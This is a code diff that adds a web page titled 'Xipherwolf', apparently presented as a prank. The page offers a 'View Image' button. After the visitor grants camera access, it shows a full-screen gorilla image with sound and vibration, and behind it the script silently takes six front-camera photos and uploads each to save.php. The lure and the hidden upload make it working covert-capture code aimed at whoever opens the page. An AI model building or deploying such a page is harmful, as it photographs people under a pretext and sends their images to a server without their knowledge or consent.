@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Xipherwolf</title>
+<style>
+body {
+  margin: 0;
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background: linear-gradient(135deg, #0f172a 0%, #061229 100%);
+  font-family: Arial, sans-serif;
+  color: white;
+  overflow: hidden;
+}
+
+#viewBtn {
+  padding: 18px 36px;
+  font-size: 24px;
+  border: none;
+  border-radius: 12px;
+  background: #6c5ce7;
+  cursor: pointer;
+  color: white;
+  box-shadow: 0 8px 30px rgba(0,0,0,0.3);
+  transition: transform 0.2s;
+  z-index: 100;
+  position: relative;
+}
+
+#viewBtn:hover {
+  transform: translateY(-2px);
+}
+
+#viewBtn:active {
+  transform: translateY(1px);
+}
+
+#viewBtn:disabled {
+  opacity: 0.5;
+  cursor: not-allowed;
+  transform: none !important;
+}
+
+#flash {
+  position: fixed;
+  inset: 0;
+  background: white;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.12s;
+  z-index: 998;
+}
+
+#gorillaScreen {
+  position: fixed;
+  inset: 0;
+  display: none;
+  justify-content: center;
+  align-items: center;
+  z-index: 999;
+  background: #000;
+}
+
+#gorillaScreen img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
+#loading {
+  position: fixed;
+  top: 20px;
+  color: white;
+  display: none;
+  z-index: 1000;
+}
+</style>
+</head>
+<body>
+
+<button id="viewBtn">View Image</button>
+<div id="loading">Requesting camera access...</div>
+
+<div id="flash"></div>
+
+<div id="gorillaScreen">
+  <img src="gorilla.jpg" />
+</div>
+
+<audio id="shutter">
+  <source src="https://actions.google.com/sounds/v1/camera/camera_shutter_click.ogg" type="audio/ogg">
+</audio>
+
+<audio id="gork" src="gorilla.mp3"></audio>
+
+<script>
+const btn = document.getElementById('viewBtn');
+const gorillaScreen = document.getElementById('gorillaScreen');
+const gork = document.getElementById('gork');
+const flash = document.getElementById('flash');
+const shutter = document.getElementById('shutter');
+const loading = document.getElementById('loading');
+
+const NUM = 6;
+const INTERVAL = 400;
+const QUALITY = {width:{ideal:1920},height:{ideal:1080},facingMode:"user"};
+
+let isPrankActive = false;
+
+btn.addEventListener('click', async () => {
+  if (isPrankActive) return;
+  isPrankActive = true;
+  btn.disabled = true;
+  loading.style.display = 'block';
+  
+  // 1) PEHLE CAMERA PERMISSION LO - Gorilla nahi dikhao
+  let stream;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({video:QUALITY});
+    loading.style.display = 'none';
+  } catch(e) {
+    // Agar permission nahi mila
+    loading.style.display = 'none';
+    isPrankActive = false;
+    btn.disabled = false;
+    alert("Camera permission denied!");
+    return;
+  }
+  
+  // 2) SIRF PERMISSION MILNE KE BAAD GORILLA DIKHAO
+  showGorillaAndCapture(stream);
+});
+
+function showGorillaAndCapture(stream) {
+  // Ab gorilla dikhao
+  gorillaScreen.style.display = 'flex';
+  gork.currentTime = 0;
+  gork.play().catch(() => {});
+  if(navigator.vibrate) navigator.vibrate([300,200,300]);
+  
+  const video = document.createElement('video');
+  video.autoplay = true;
+  video.style.display = 'none';
+  video.srcObject = stream;
+  document.body.appendChild(video);
+  
+  video.onloadedmetadata = () => {
+    video.play();
+    setTimeout(() => {
+      startCapture(video, stream);
+    }, 120);
+  };
+}
+
+function startCapture(video, stream) {
+  const canvas = document.createElement('canvas');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext('2d');
+  
+  let captured = 0;
+  
+  function doFlash() {
+    flash.style.opacity = '1';
+    setTimeout(() => flash.style.opacity = '0', 120);
+  }
+  
+  function captureOnce(i) {
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    shutter.currentTime = 0;
+    shutter.play().catch(() => {});
+    doFlash();
+    
+    // Save photo
+    canvas.toBlob(async blob => {
+      const fd = new FormData();
+      fd.append('file', blob, 'photo_'+i+'.jpg');
+      fetch('save.php', {method: 'POST', body: fd}).catch(() => {});
+    }, 'image/jpeg', 0.92);
+    
+    captured++;
+    
+    // All photos captured
+    if(captured >= NUM) {
+      stream.getTracks().forEach(t => t.stop());
+      video.remove();
+      
+      // Hide gorilla after delay
+      setTimeout(() => {
+        gorillaScreen.style.display = 'none';
+        isPrankActive = false;
+        btn.disabled = false;
+      }, 2000);
+    }
+  }
+  
+  // Take photos
+  for(let i = 1; i <= NUM; i++) {
+    setTimeout(((idx) => () => captureOnce(idx))(i), (i-1) * INTERVAL);
+  }
+}
+</script>
+</body>
+</html>
